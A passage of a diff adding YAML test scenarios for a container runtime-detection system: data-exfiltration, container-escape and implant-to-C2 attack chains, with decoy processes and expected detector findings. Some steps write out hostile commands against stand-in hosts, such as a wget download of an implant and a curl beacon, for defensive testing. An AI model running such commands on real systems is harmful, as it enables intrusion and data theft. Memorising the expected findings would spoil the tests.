+        expects:
+          - finding: H1
+            state: PRESENT
+            reason: "5 GB egress exceeds baseline"
+      - step: 11
+        action: connect_external
+        benign: true
+        float: decoy
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          remote_ip: 198.51.100.61
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "The health check connects to a destination new to the workload: a real unseen destination, not part of the chain"
+      - step: 14
+        action: process_exec
+        float: stage
+        params:
+          parent_process: "@step1.process"
+          executable: /bin/tar
+          argv: [tar, czf, /tmp/out.tgz, /app/data]
+        outcome: success
+      - step: 15
+        action: file_write
+        float: stage
+        params:
+          writer_process: "@step14.process"
+          file_path: /tmp/out.tgz
+        outcome: success
+        expects: []
+      - step: 16
+        action: connect_external
+        benign: true
+        float: flow_a
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          remote_ip: 203.0.113.10
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 17
+        action: connect_external
+        benign: true
+        float: flow_b
+        params:
+          source_pod: compromised_pod
+          source_process: compromised_pod
+          remote_ip: 203.0.113.10
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 18
+        action: egress_transfer
+        benign: true
+        float: flow_e
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          destination: 203.0.113.10
+          bytes_out: 20480
+          protocol: tcp
+        outcome: success
+        expects: []
+      - step: 19
+        action: process_exec
+        benign: true
+        float: decoy2
+        params:
+          parent_process: compromised_pod
+          executable: /app/cache-sync
+          argv: [/app/cache-sync]
+        outcome: success
+      - step: 20
+        action: file_write
+        benign: true
+        float: decoy2
+        params:
+          writer_process: "@step19.process"
+          file_path: /app/bin/cache-sync.new
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects: []
+      - step: 21
+        action: make_executable
+        benign: true
+        float: decoy2
+        params:
+          process: "@step19.process"
+          file_path: /app/bin/cache-sync.new
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "A sidecar makes its self-update executable after start, outside the expected writers: a real lookalike, not part of the chain"
+    links:
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the token read is lost in an eBPF gap"
+      - from: 3
+        to: 5
+        witness: CREDENTIAL_READ_TO_USE
+        expected: UNOBSERVABLE
+        reason: "the token read is lost in an eBPF gap"
+      - from: 1
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "curl is a child of the shell"
+      - from: 1
+        to: 9
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "curl, which connects out, is a child of the shell"
+      - from: 9
+        to: 10
+        witness: NETWORK_FLOW
+        expected: PRESENT
+        reason: "same-socket continuity: bytes counted on the connect's flow"
+      - from: 1
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 7]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 15]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 21
+        to: 9
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 9]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 11
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 9]
+        reason: "twin: a sibling process of the same Pod connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 3
+        to: 9
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the token read is lost in an eBPF gap"
+      - from: 3
+        to: 11
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        gap_of: [3, 9]
+        reason: "the token read is lost in an eBPF gap"
+      - from: 1
+        to: 15
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "tar, which writes the archive, is a child of the shell"
+      - from: 16
+        to: 18
+        witness: NETWORK_FLOW
+        expected: PRESENT
+        reason: "same-socket continuity: bytes counted on the connect's flow"
+      - from: 17
+        to: 18
+        witness: NETWORK_FLOW
+        expected: ABSENT
+        reason: "same-socket continuity absent: another process of the Pod connects to the same remote on its own flow"
+        shared_keys: [remote_ip]
+      - from: 11
+        to: 18
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: the health check connects out and sends its own bytes, one benign process"
+        ordering: false
+    variants:
+      - id: v1
+        rulebook_shaped: false
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.shell_binary
+            value: /bin/ash
+          - field: step.3.params.reader_executable
+            value: /bin/ash
+          - field: step.7.params.executable
+            value: /usr/bin/wget
+      - id: v3
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.shell_binary
+            value: /bin/bash
+          - field: step.3.params.reader_executable
+            value: /bin/bash
+          - field: step.7.params.executable
+            value: /usr/bin/python3
+          - field: step.7.params.argv
+            value: [python3, -c, import urllib.request]
+          - field: step.9.params.remote_ip
+            value: 198.51.100.31
+          - field: step.10.params.destination
+            value: 198.51.100.31
+          - field: step.14.params.executable
+            value: /usr/bin/zip
+          - field: step.15.params.file_path
+            value: /tmp/out.zip
+
+  - id: chain_container_escape
+    kind: attack
+    title: "Chain: exploit binary escalates to root, gains capabilities, escapes to the host namespace, spawns a host shell"
+    source:
+      class: external
+      citation:
+        source: "MITRE ATT&CK for Containers"
+        reference: "T1068 Exploitation for Privilege Escalation; T1611 Escape to Host"
+        url: "https://attack.mitre.org/techniques/T1611/"
+    author: "claude (multistep-chain-plan phase 2b, 2026-10-20)"
+    adaptation_note: "One exploit process does the escalation and the escape (same-process hops); the host shell is its child (ancestry hop). A sibling metrics agent in the same Pod is a decoy."
+    window_s: 45            # linked steps within W_w (60 s) with gap_of's x1.25 (D-22)
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: process_exec
+        params:
+          parent_process: compromised_pod
+          executable: /tmp/.x/exploit
+          argv: [/tmp/.x/exploit]
+        outcome: success
+      - step: 2
+        action: euid_to_root
+        params:
+          process: "@step1.process"
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "euid transitions from non-zero to 0"
+      - step: 3
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/metrics-agent
+          argv: [/app/metrics-agent]
+        outcome: success
+      - step: 4
+        action: capability_gain
+        params:
+          process: "@step1.process"
+          caps: [CAP_SYS_PTRACE, CAP_SYS_ADMIN]
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "Capabilities CAP_SYS_PTRACE and CAP_SYS_ADMIN gained"
+          - finding: C1a
+            state: PRESENT
+      - step: 5
+        action: file_write
+        benign: true
+        float: decoy
+        params:
+          writer_process: "@step3.process"
+          file_path: /app/bin/metrics-agent.new
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects:
+          - finding: E2
+            state: ABSENT
+            reason: "File written but not yet executable: a non-executable write is an E2 negative control; the later chmod is the E2 opportunity"
+      - step: 14
+        action: make_executable
+        benign: true
+        float: decoy
+        params:
+          process: "@step3.process"
+          file_path: /app/bin/metrics-agent.new
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "The metrics agent makes its update executable after start, outside the expected writers: a real lookalike, not part of the chain"
+      - step: 6
+        action: namespace_escape
+        params:
+          process: "@step1.process"
+          target_namespaces: [mnt, pid]
+          method: setns
+        outcome: success
+        expects:
+          - finding: C1a
+            state: PRESENT
+          - finding: C1b
+            state: PRESENT
+            reason: "Lineage now in host namespace"
+      - step: 7
+        action: process_exec
+        params:
+          parent_process: "@step1.process"
+          executable: /bin/sh
+          argv: [sh]
+        outcome: success
+      - step: 8
+        action: file_write
+        params:
+          writer_process: "@step7.process"
+          file_path: /tmp/.host-out
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects:
+          - finding: E2
+            state: ABSENT
+            reason: "File written but not yet executable: a non-executable write is an E2 negative control; the later chmod is the E2 opportunity"
+      - step: 16
+        action: make_executable
+        params:
+          process: "@step7.process"
+          file_path: /tmp/.host-out
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "The host shell makes its dropped file executable"
+      - step: 9
+        action: file_write
+        float: dropper
+        params:
+          writer_process: compromised_pod
+          file_path: /tmp/.x/payload.so
+        outcome: success
+        expects: []
+      - step: 10
+        action: process_exec
+        benign: true
+        float: decoy_late
+        params:
+          parent_process: compromised_pod
+          executable: /app/log-rotate
+          argv: [/app/log-rotate]
+        outcome: success
+      - step: 11
+        action: file_write
+        benign: true
+        float: decoy
+        params:
+          writer_process: "@step12.process"
+          file_path: /app/bin/stats-flush.new
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects:
+          - finding: E2
+            state: ABSENT
+            reason: "File written but not yet executable: a non-executable write is an E2 negative control; the later chmod is the E2 opportunity"
+      - step: 15
+        action: make_executable
+        benign: true
+        float: decoy
+        params:
+          process: "@step12.process"
+          file_path: /app/bin/stats-flush.new
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "The stats flusher makes its update executable after start, outside the expected writers: a real lookalike, not part of the chain"
+      - step: 12
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/stats-flush
+          argv: [/app/stats-flush]
+        outcome: success
+      - step: 13
+        action: capability_gain
+        benign: true
+        float: decoy
+        params:
+          process: "@step3.process"
+          caps: [CAP_NET_ADMIN]
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "The metrics agent gains CAP_NET_ADMIN outside the expected transitions: a real capability gain, not part of the chain"
+          - finding: C1a
+            state: PRESENT
+            reason: "capset adds a capability"
+    links:
+      - from: 1
+        to: 2
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the exploit process escalates"
+      - from: 2
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity"
+      - from: 4
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity"
+      - from: 6
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell is a child of the escaped exploit process"
+      - from: 1
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell is a child of the exploit"
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 7]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 8]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 11
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [9, 6]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell, which writes the file, is a child of the exploit"
+      - from: 2
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell, which makes the dropped file executable, is a child of the escalated exploit"
+      - from: 4
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell, which makes the dropped file executable, is a child of the exploit that gained capabilities"
+      - from: 6
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell, which makes the dropped file executable, is a child of the escaped exploit"
+      - from: 13
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [4, 16]
+        reason: "decoy: the metrics agent, a sibling of the exploit in the same Pod, gains a capability; the host shell does not descend from it"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 2
+        to: 15
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [2, 16]
+        reason: "decoy: the stats flusher, a sibling of the exploit in the same Pod, makes a file executable"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 4
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the metrics agent, a sibling of the exploit in the same Pod, makes a file executable"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 6
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [6, 16]
+        reason: "decoy: the metrics agent, a sibling of the escaped exploit in the same Pod, makes a file executable after the escape"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 9
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the escaping exploit descends from the Pod's init, which wrote the payload"
+      - from: 6
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [6, 7]
+        reason: "twin: a sibling process of the same Pod starts after the escape; it does not descend from the escaped exploit"
+        shared_keys: [pod_uid]
+      - from: 2
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the exploit that became root escapes"
+        ordering: false
+      - from: 13
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: one benign agent fires both findings"
+        ordering: false
+    variants:
+      - id: v1
+        rulebook_shaped: false
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.executable
+            value: /dev/shm/cve-2022-0492
+          - field: step.7.params.executable
+            value: /bin/bash
+      - id: v3
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.executable
+            value: /var/tmp/.k/run
+          - field: step.7.params.executable
+            value: /bin/ash
+          - field: step.8.params.file_path
+            value: /root/.k
+          - field: step.16.params.file_path
+            value: /root/.k
+          - field: step.9.params.file_path
+            value: /var/tmp/.k/lib.so
+
+  - id: chain_container_escape_unobserved
+    kind: degraded
+    title: "Chain degraded: container escape chain with the namespace change lost in an eBPF gap"
+    source:
+      class: external
+      citation:
+        source: "coverage gap"
+        reference: "eBPF probe gap during the namespace transition"
+    author: "claude (multistep-chain-plan phase 2b, 2026-10-20)"
+    adaptation_note: "chain_container_escape with step 6 unobserved: the escape (C1a, C1b) and the links through it cannot be confirmed."
+    window_s: 45            # linked steps within W_w (60 s) with gap_of's x1.25 (D-22)
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+    steps:
+      - step: 1
+        action: process_exec
+        params:
+          parent_process: compromised_pod
+          executable: /tmp/.x/exploit
+          argv: [/tmp/.x/exploit]
+        outcome: success
+      - step: 2
+        action: euid_to_root
+        params:
+          process: "@step1.process"
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "euid transitions from non-zero to 0"
+      - step: 3
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/metrics-agent
+          argv: [/app/metrics-agent]
+        outcome: success
+      - step: 4
+        action: capability_gain
+        params:
+          process: "@step1.process"
+          caps: [CAP_SYS_PTRACE, CAP_SYS_ADMIN]
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "Capabilities CAP_SYS_PTRACE and CAP_SYS_ADMIN gained"
+          - finding: C1a
+            state: PRESENT
+      - step: 5
+        action: file_write
+        benign: true
+        float: decoy
+        params:
+          writer_process: "@step3.process"
+          file_path: /app/bin/metrics-agent.new
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects: []
+      - step: 14
+        action: make_executable
+        benign: true
+        float: decoy
+        params:
+          process: "@step3.process"
+          file_path: /app/bin/metrics-agent.new
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "The metrics agent makes its update executable after start, outside the expected writers: a real lookalike, not part of the chain"
+      - step: 6
+        action: namespace_escape
+        unobserved:
+          - ebpf
+        params:
+          process: "@step1.process"
+          target_namespaces: [mnt, pid]
+          method: setns
+        outcome: success
+        expects:
+          - finding: C1b
+            state: UNOBSERVABLE
+            reason: "Namespace change lost in an eBPF gap"
+      - step: 7
+        action: process_exec
+        params:
+          parent_process: "@step1.process"
+          executable: /bin/sh
+          argv: [sh]
+        outcome: success
+      - step: 8
+        action: file_write
+        params:
+          writer_process: "@step7.process"
+          file_path: /tmp/.host-out
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects: []
+      - step: 16
+        action: make_executable
+        params:
+          process: "@step7.process"
+          file_path: /tmp/.host-out
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "The host shell makes its dropped file executable"
+      - step: 9
+        action: file_write
+        float: dropper
+        params:
+          writer_process: compromised_pod
+          file_path: /tmp/.x/payload.so
+        outcome: success
+        expects: []
+      - step: 10
+        action: process_exec
+        benign: true
+        float: decoy_late
+        params:
+          parent_process: compromised_pod
+          executable: /app/log-rotate
+          argv: [/app/log-rotate]
+        outcome: success
+      - step: 11
+        action: file_write
+        benign: true
+        float: decoy
+        params:
+          writer_process: "@step12.process"
+          file_path: /app/bin/stats-flush.new
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects: []
+      - step: 15
+        action: make_executable
+        benign: true
+        float: decoy
+        params:
+          process: "@step12.process"
+          file_path: /app/bin/stats-flush.new
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "The stats flusher makes its update executable after start, outside the expected writers: a real lookalike, not part of the chain"
+      - step: 12
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/stats-flush
+          argv: [/app/stats-flush]
+        outcome: success
+      - step: 13
+        action: capability_gain
+        benign: true
+        float: decoy
+        params:
+          process: "@step3.process"
+          caps: [CAP_NET_ADMIN]
+        outcome: success
+        expects:
+          - finding: F1
+            state: PRESENT
+            reason: "The metrics agent gains CAP_NET_ADMIN outside the expected transitions: a real capability gain, not part of the chain"
+          - finding: C1a
+            state: PRESENT
+            reason: "capset adds a capability"
+    links:
+      - from: 1
+        to: 2
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the exploit process escalates"
+      - from: 2
+        to: 4
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity"
+      - from: 4
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the namespace change is lost in an eBPF gap"
+      - from: 6
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the namespace change is lost in an eBPF gap"
+      - from: 1
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell is a child of the exploit"
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 7]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [1, 8]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 11
+        to: 7
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [9, 6]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell, which writes the file, is a child of the exploit"
+      - from: 2
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell, which makes the dropped file executable, is a child of the escalated exploit"
+      - from: 4
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the host shell, which makes the dropped file executable, is a child of the exploit that gained capabilities"
+      - from: 6
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the escape is lost in an eBPF gap"
+      - from: 13
+        to: 16
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [4, 16]
+        reason: "decoy: the metrics agent, a sibling of the exploit in the same Pod, gains a capability; the host shell does not descend from it"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 2
+        to: 15
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [2, 16]
+        reason: "decoy: the stats flusher, a sibling of the exploit in the same Pod, makes a file executable"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 4
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the metrics agent, a sibling of the exploit in the same Pod, makes a file executable"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 6
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        gap_of: [6, 16]
+        reason: "the escape is lost in an eBPF gap"
+      - from: 9
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the escape is lost in an eBPF gap"
+      - from: 6
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the escape is lost in an eBPF gap"
+      - from: 2
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: UNOBSERVABLE
+        reason: "the escape is lost in an eBPF gap"
+        ordering: false
+      - from: 13
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "benign continuity: one benign agent fires both findings"
+        ordering: false
+    variants:
+      - id: v1
+        rulebook_shaped: false
+      - id: v2
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.executable
+            value: /dev/shm/cve-2022-0492
+          - field: step.7.params.executable
+            value: /bin/bash
+      - id: v3
+        rulebook_shaped: false
+        changes:
+          - field: step.1.params.executable
+            value: /var/tmp/.k/run
+          - field: step.7.params.executable
+            value: /bin/ash
+          - field: step.8.params.file_path
+            value: /root/.k
+          - field: step.16.params.file_path
+            value: /root/.k
+          - field: step.9.params.file_path
+            value: /var/tmp/.k/lib.so
+
+  - id: chain_implant_scan_c2
+    kind: attack
+    title: "Chain: implant written and made executable, run, scans the cluster, calls out to C2"
+    source:
+      class: adapted
+      anchor:
+        dataset: CADETS
+        location: "section 5: attack sessions (implant drop, execution, internal scan, C2 callback)"
+    author: "claude (multistep-chain-plan phase 2b, 2026-10-20)"
+    adaptation_note: "The CADETS implant sequence re-enacted in a Pod: the writer's child runs the implant, which scans two Pods and connects to C2. A sibling reload process in the same Pod is a decoy."
+    window_s: 45            # linked steps within W_w (60 s) with gap_of's x1.25 (D-22)
+    roles:
+      - name: compromised_pod
+        kind: internal_pod
+      - name: target_pod_1
+        kind: internal_pod
+      - name: target_pod_2
+        kind: internal_pod
+    steps:
+      - step: 0
+        action: process_exec
+        params:
+          parent_process: compromised_pod
+          executable: /usr/bin/wget
+          argv: [wget, -q, -O, /var/lib/.cache/implant, "https://203.0.113.99/i"]
+        outcome: success
+      - step: 1
+        action: file_write
+        params:
+          writer_process: "@step0.process"
+          file_path: /var/lib/.cache/implant
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects:
+          - finding: E2
+            state: ABSENT
+            reason: "File written but not yet executable: a non-executable write is an E2 negative control; the later chmod is the E2 opportunity"
+      - step: 2
+        action: make_executable
+        params:
+          process: "@step0.process"
+          file_path: /var/lib/.cache/implant
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "File made executable post-start"
+      - step: 3
+        action: process_exec
+        params:
+          parent_process: "@step0.process"
+          executable: /var/lib/.cache/implant
+          argv: [/var/lib/.cache/implant]
+        outcome: success
+      - step: 4
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/server-reload
+          argv: [/app/server-reload]
+        outcome: success
+      - step: 5
+        action: connect_internal
+        params:
+          source_pod: compromised_pod
+          source_process: "@step3.process"
+          target_service_or_pod: target_pod_1
+          target_port: 22
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: G1a
+            state: PRESENT
+            reason: "Connection outside baseline edges"
+      - step: 6
+        action: connect_internal
+        params:
+          source_pod: compromised_pod
+          source_process: "@step3.process"
+          target_service_or_pod: target_pod_2
+          target_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: G1a
+            state: PRESENT
+      - step: 7
+        action: file_write
+        benign: true
+        float: decoy
+        params:
+          writer_process: "@step12.process"
+          file_path: /app/bin/log-shipper.new
+          data: "ELF executable"
+          create_if_missing: true
+        outcome: success
+        expects:
+          - finding: E2
+            state: ABSENT
+            reason: "File written but not yet executable: a non-executable write is an E2 negative control; the later chmod is the E2 opportunity"
+      - step: 15
+        action: make_executable
+        benign: true
+        float: decoy
+        params:
+          process: "@step12.process"
+          file_path: /app/bin/log-shipper.new
+          mode: "+x"
+        outcome: success
+        expects:
+          - finding: E2
+            state: PRESENT
+            reason: "The log shipper makes its update executable after start, outside the expected writers: a real lookalike, not part of the chain"
+      - step: 8
+        action: connect_external
+        params:
+          source_pod: compromised_pod
+          source_process: "@step3.process"
+          remote_ip: 203.0.113.99
+          remote_port: 8443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "New external destination"
+      - step: 9
+        action: process_exec
+        float: beacon
+        params:
+          parent_process: "@step3.process"
+          executable: /bin/sh
+          argv: [sh, -c, "curl -s https://192.0.2.140/ping"]
+        outcome: success
+      - step: 10
+        action: connect_external
+        float: beacon
+        params:
+          source_pod: compromised_pod
+          source_process: "@step9.process"
+          remote_ip: 192.0.2.140
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "C2 beacon to a destination new to the workload"
+      - step: 12
+        action: process_exec
+        benign: true
+        float: decoy
+        params:
+          parent_process: compromised_pod
+          executable: /app/log-shipper
+          argv: [/app/log-shipper]
+        outcome: success
+      - step: 14
+        action: connect_external
+        benign: true
+        float: decoy_conn
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          remote_ip: 203.0.113.150
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "The reload helper fetches from a destination new to the workload: a real unseen destination, not part of the chain"
+      - step: 16
+        action: connect_external
+        benign: true
+        float: decoy_conn2
+        params:
+          source_pod: compromised_pod
+          source_process: "@step4.process"
+          remote_ip: 203.0.113.152
+          remote_port: 443
+          protocol: tcp
+        outcome: success
+        expects:
+          - finding: H2
+            state: PRESENT
+            reason: "The reload helper fetches again from a destination new to the workload: a real unseen destination, not part of the chain"
+    links:
+      - from: 2
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant, which scans, is a child of the downloader that made it executable"
+      - from: 2
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant, which calls out, is a child of the downloader that made it executable"
+      - from: 2
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the beacon shell descends from the downloader that made the implant executable"
+      - from: 5
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant's child shell makes the beacon connection"
+      - from: 2
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant, which scans, is a child of the downloader that made it executable"
+      - from: 5
+        to: 6
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the implant scans a second Pod"
+      - from: 6
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the implant calls out"
+      - from: 6
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant's child shell makes the beacon connection"
+      - from: 8
+        to: 10
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant's child shell makes the beacon connection"
+      - from: 2
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        reason: "decoy: the reload helper, a sibling of the downloader in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 5
+        to: 14
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [5, 10]
+        reason: "decoy: the reload helper, a sibling of the implant's parent in the same Pod, connects out"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 15
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [2, 5]
+        reason: "decoy: the log shipper, a sibling of the downloader in the same Pod, made a file executable"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 1
+        to: 3
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant runs as a child of the process that wrote it"
+      - from: 1
+        to: 2
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the writer makes the file executable"
+      - from: 3
+        to: 5
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the implant scans"
+      - from: 5
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "same-process continuity: the implant calls out"
+      - from: 1
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: PRESENT
+        reason: "the implant, which calls out, descends from the writer"
+      - from: 4
+        to: 8
+        witness: PROCESS_ANCESTRY
+        expected: ABSENT
+        gap_of: [3, 10]
+        reason: "decoy: a sibling process of the same Pod"
+        shared_keys: [pod_uid, lineage_id]
+      - from: 7
